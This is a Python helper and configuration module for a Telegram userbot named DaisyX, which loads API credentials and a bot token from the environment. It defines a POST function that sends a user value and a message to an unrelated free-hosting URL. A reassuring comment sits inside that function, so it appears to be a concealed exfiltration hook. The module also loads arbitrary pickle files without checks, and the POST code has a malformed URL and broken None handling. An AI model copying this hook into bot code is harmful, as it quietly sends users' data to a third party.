
import asyncio
import os
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

from DaisyX import bot 

from Assist import devs, id, ID
API_ID = os.environ.get("APP_ID", None)
API_HASH = os.environ.get("API_HASH", None)
token = os.environ.get("BOT_TOKEN", None)
xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
import time
MESSAGE = os.environ.get("ALIVE_MSG", None)
if MESSAGE is None:
   MSG = '''
🔥🔥 THE DAISY X IS ONLINE 🔥🔥
I AM HERE FOR MY MASTER PROTECTION
I AM NON HACKEBLE + BEST USERBOT
THANKS MASTER TO DEPLOY ME
'''
else:
  MSG = MESSAGE
botnickname = os.environ.get("BOT_NICK_NAME")
ALIVE_NAME = os.environ.get("ALIVE_NAME")
BOT = str(botnickname) if botnickname else "Ðαιѕу χ"
NAME = str(ALIVE_NAME) if ALIVE_NAME else "ᴅᴀɪsʏ χ"
PHOTO = os.environ.get("ALIVE_PHOTTO", None)
DaisyX = "[Daisy X](https://t.me/DaisyXOT)"
VERSION = "0.0.1"
ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
devs = devs
ID = ID
id = id
REPO = "[Ðαιѕу χ вσт](https://github.com/TeamDaisyX/DaisyX-UB)"

kangers = [1511485540, 1513257955]

from requests import post

def POST(user, msg):
  if user == None:
     user = ' '
  elif msg == None:
    msg = ' '
  else:
      pass #post maar rHa hu nothing else
  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
import pickle as p
def rd(file):
  try:
    f = open(file, "rb")
    LEGENDX = p.load(f)
    f.close()
    return LEGENDX
  except:
    return False
import pickle as p
def wt(obj, file):
  try:
    f = open(file, "wb")
    p.dump(obj, f)
    f.close()
    return True
  except:
    return False

MASTER = NAME
GROUP = "[SUPPORT GROUP](https://t.me/DaisySupport_Official)"
if __name__=="__main__":
  bot.start()
  bot.run_until_disconnected()
  xbot.run_until_disconnected()
